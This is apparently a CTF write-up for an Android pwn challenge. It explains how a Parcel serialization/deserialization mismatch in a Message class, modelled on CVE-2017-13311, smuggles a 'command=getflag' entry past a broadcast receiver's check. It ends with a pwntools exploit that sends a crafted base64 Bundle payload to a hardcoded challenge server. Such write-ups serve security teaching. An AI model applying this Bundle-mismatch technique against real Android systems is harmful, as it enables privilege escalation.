## BroadCastTest
[中文](./README_zh.md) [English](./README.md)
[attachment](./BroadcastTest.apk)

这道题是一道android pwn
主要的漏洞点是关于序列化与反序列化不匹配的漏洞
这道题主要是由CVE-2017-13311等启发而成

可以阅读https://xz.aliyun.com/t/2364这篇文章，里面详细的说明了类似漏洞的原理

在apk中，首先读取了Base64字符串，base64deocdeo之后将其作为一个Bundle放到广播中，发送给Receiver2
Receiver2接收到广播，取出Bundle，再从Bundle里面取出key为command的值，判断是否为getflag，不是的话就可以继续广播到Receiver3
Receiver3接收到广播，取出Bundle，判断command是否为getflag，是的话就输出Congratulation

正常途径是不能绕过这个判断的，但是在apk中存在一个com.de1ta.broadcasttest.MainActivity$Message类，里面的序列化和反序列化是不匹配的

在Receiver2中判断会command是否为flag会导致Bundle进行反序列化，之后发送给Receiver3的时候会进行序列化，最后Receiver3接收到Bundle后会进行最后一次反序列化

利用漏洞，可以在Receiver2中反序列化的时候获取不到key为command的string，在序列化之后就出现了key为command，值为getflag的string，然后Receiver3的check就能通过，最终获取到flag

下面是exp
```
from pwn import *
import base64
from hashlib import sha256
import itertools
import string
context.log_level = 'debug'

def proof_of_work(chal):
    #for i in itertools.permutations(string.ascii_letters+string.digits, 4):
    for i in itertools.permutations([chr(i) for i in range(256)], 4):
        sol = ''.join(i)
        if sha256(chal + sol).digest().startswith('\0\0\0'):
            return sol


a = 'SAEAAEJOREwDAAAACAAAAG0AaQBzAG0AYQB0AGMAaAAAAAAABAAAACwAAABjAG8AbQAuAGQAZQAxAHQAYQAuAGIAcgBvAGEAZABjAGEAcwB0AHQAZQBzAHQALgBNAGEAaQBuAEEAYwB0AGkAdgBpAHQAeQAkAE0AZQBzAHMAYQBnAGUAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAwAAAA0AAAA0AAAADQAAAAAAAAAHAAAAYwBvAG0AbQBhAG4AZAAAAAAAAAAHAAAAZwBlAHQAZgBsAGEAZwAAAAcAAABjAG8AbQBtAGEAbgBkAAAAAAAAAA0AAABQAGEAZABkAGkAbgBnAC0AVgBhAGwAdQBlAAAA'
b = base64.b64decode(a)
p = remote('206.189.186.98', 8848)
p.recvuntil('chal= ')
chal = p.recvuntil('\n')[:-1]
p.recvuntil('>>\n')
sol = proof_of_work(chal)
p.send(sol)
p.recvuntil('size')
p.sendline(str(len(b)))
p.recvuntil('please input payload:')
p.send(b)
p.interactive()
```
